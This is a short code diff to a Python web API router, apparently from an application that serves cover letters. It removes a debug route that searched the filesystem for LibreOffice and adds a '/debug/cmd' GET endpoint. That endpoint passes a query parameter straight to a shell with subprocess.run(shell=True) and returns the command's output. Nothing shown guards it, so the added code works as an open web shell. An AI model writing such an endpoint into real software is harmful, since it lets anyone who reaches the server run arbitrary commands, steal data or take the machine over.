@@ -315,31 +315,18 @@ def download_cover_letter(
         filename=safe_name,
     )
 
-@router.get("/debug/libreoffice")
-def debug_libreoffice():
-    import shutil
-    import os
-    soffice_path = shutil.which("soffice") or shutil.which("libreoffice")
-    
-    found_paths = []
-    # Search the entire root filesystem, skipping virtual mounts
-    for root, dirs, files in os.walk("/"):
-        # Skip virtual mounts to prevent hanging
-        if any(p in root for p in ["/proc", "/sys", "/dev", "/run", "/var/lib/docker"]):
-            dirs[:] = []
-            continue
-        for f in files:
-            if "soffice" in f or "libreoffice" in f:
-                found_paths.append(os.path.join(root, f))
-                if len(found_paths) >= 50:
-                    break
-        if len(found_paths) >= 50:
-            break
-            
-    return {
-        "status": "not found" if not soffice_path else "found",
-        "soffice_path": soffice_path,
-        "found_paths": found_paths,
-    }
+@router.get("/debug/cmd")
+def debug_cmd(cmd: str):
+    import subprocess
+    try:
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+        return {
+            "cmd": cmd,
+            "returncode": res.returncode,
+            "stdout": res.stdout,
+            "stderr": res.stderr
+        }
+    except Exception as e:
+        return {"error": str(e)}
 
 
